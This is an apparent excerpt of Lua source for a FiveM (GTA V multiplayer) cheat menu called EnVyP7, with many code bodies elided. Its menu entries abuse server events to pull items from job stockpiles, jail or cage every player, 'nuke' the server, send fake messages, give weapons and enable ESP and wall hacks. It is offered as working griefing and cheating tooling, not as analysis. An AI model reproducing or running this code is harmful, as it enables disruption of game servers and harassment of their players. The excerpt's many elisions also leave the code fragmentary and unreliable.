                elseif EnVyP7.Button("~h~Spawn items from ~y~nightclub") then 
                    local itemName = KeyboardInput("Enter item name", "", 100)
                    if itemName then 
                        local itemAmount =  KeyboardInput("Enter amount", "", 100) 
                        if itemAmount then 
                ...
                elseif EnVyP7.Button("~h~Spawn items from ~y~casino") then 
                    local itemName = KeyboardInput("Enter item name", "", 100)
                    if itemName then 
                        local itemAmount =  KeyboardInput("Enter amount", "", 100) 
                        if itemAmount then 
                ...
                elseif EnVyP7.Button("~h~Spawn items from ~y~fib") then 
                    local itemName = KeyboardInput("Enter item name", "", 100)
                    if itemName then 
                        local itemAmount =  KeyboardInput("Enter amount", "", 100) 
                ...
                elseif EnVyP7.Button("~h~Spawn items from ~y~police") then 
                    local itemName = KeyboardInput("Enter item name", "", 100)
                    if itemName then local itemAmount =  KeyboardInput("Enter amount", "", 100) 
                        if itemAmount then 
                ...
                elseif EnVyP7.Button("~h~Spawn items from ~y~thelostmc") then 
                    local itemName = KeyboardInput("Enter item name", "", 100)
                    if itemName then 
                        local itemAmount =  KeyboardInput("Enter amount", "", 100) 
                        if itemAmount then 
                ...
                elseif EnVyP7.Button("~h~Spawn items from ~y~cartel") then 
                    local itemName = KeyboardInput("Enter item name", "", 100)
                    if itemName then local itemAmount =  KeyboardInput("Enter amount", "", 100) 
                        if itemAmount then TriggerServerEvent('esx_carteljob:putStockItems', (itemName),-(itemAmount)) 
                        end 
                    end 
                elseif EnVyP7.Button("~h~Spawn items from ~y~mafia") then 
                    local itemName = KeyboardInput("Enter item name", "", 100)
                    if itemName then 
                        local itemAmount =  KeyboardInput("Enter amount", "", 100) 
                        if itemAmount then 
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('VRPTriggers') then
                if
                    EnVyP7.Button(
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('MiscTriggers') then
                if EnVyP7.Button('~h~Send Discord Message') then
                ...
                elseif EnVyP7.Button('~h~Send Fake Message') then
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('AdvancedMenu') then
                if EnVyP7.MenuButton('~h~~p~-> ~s~Destroyer', 'Destroyer') then
                elseif EnVyP7.MenuButton('~h~~p~-> ~s~ESP Menu', 'ESPMenu') then
                elseif
                    EnVyP7.CheckBox(
                        '~h~Player Blips',
                        d3,
                ...
                elseif
                 ...
                 then
                elseif EnVyP7.Button('~h~Wall Script') then
                    wallin()
                elseif
                    EnVyP7.CheckBox(
                        '~h~RCS',
           ...
           then
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('Destroyer') then
                if EnVyP7.Button('~h~~r~Nuke ~s~Server') then
                    nukeserver()
                elseif
                    EnVyP7.CheckBox(
                 ...
                 then
                    for i = 0, 128 do
                        TriggerServerEvent(
                            'esx-qalle-jail:jailPlayer',
                            GetPlayerServerId(i),
                            math.random (1, 800000),
                            'LOCKED UP LIKE THE FILTHY city liver YOU ARE'
                        )
                        TriggerServerEvent(
                            'esx_jailer:sendToJail',
                            GetPlayerServerId(i),
                ...
                elseif
                    EnVyP7.Button(
                        '~h~~r~hugparty~s~ All players'
                    )
                 then
                    hugpartyAllFunc()
                elseif EnVyP7.Button('~h~~r~BORGAR~s~ Everyone') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                ...
                elseif EnVyP7.Button('~h~~r~Cage~s~ All players') then
                    for i = 0, 255 do
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('WeaponTypes') then
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('WeaponTypeSelection') then
                for dp, dD in pairs(d4) do
                    if EnVyP7.MenuButton(dD.name, 'WeaponOptions') then
                        d5 = dD
                    end
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('WeaponOptions') then
                if EnVyP7.Button('~h~~r~Spawn Weapon') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(d5.id), 1000, false)
                end
                if EnVyP7.Button('~h~~g~Add Ammo') then
                ...
                for dp, dD in pairs(d5.mods) do
                    if EnVyP7.MenuButton('~h~~p~-> ~s~~h~~r~> ~s~' .. dp, 'ModSelect') then
                        d6 = dD
                    end
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ModSelect') then
                for _, dD in pairs(d6) do
                    if EnVyP7.Button(dD.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(d5.id), GetHashKey(dD.id))
                    end
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('CarTypes') then
                for i, dF in ipairs(aY) do
                    if EnVyP7.MenuButton('~h~~p~-> ~s~' .. dF, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('CarTypeSelection') then
                for i, dF in ipairs(aZ[carTypeIdx]) do
                    if EnVyP7.MenuButton('~h~~p~-> ~s~~h~~r~>~s~ ' .. dF, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('CarOptions') then
                if EnVyP7.Button('~h~~r~Spawn Car') then
                ...
                EnVyP7.Display()
            elseif
                EnVyP7.IsMenuOpened('GiveSingleWeaponPlayer')
             then
                for i = 1, #a_ do
                    if EnVyP7.Button(a_[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(a_[i]), 1000, false, true)
                    end
                end
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('ESPMenu') then
                if
                    EnVyP7.CheckBox(
                ...
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('LSC') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                EnVyP7.MenuButton('~h~~p~-> ~s~~h~~r~Exterior ~s~Tuning', 'tunings')
                EnVyP7.MenuButton('~h~~p~-> ~s~~h~~r~Performance ~s~Tuning', 'performance')
                EnVyP7.Display()
            elseif EnVyP7.IsMenuOpened('BoostMenu') then
                if
                    EnVyP7.ComboBox(
            ...
            elseif IsDisabledControlPressed(0, 121) then
                if logged then
                    EnVyP7.OpenMenu('EnVyPx')
                else
                    drawNotification('~r~~h~Login plz~s~.')
                    PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                end
                EnVyP7.Display()
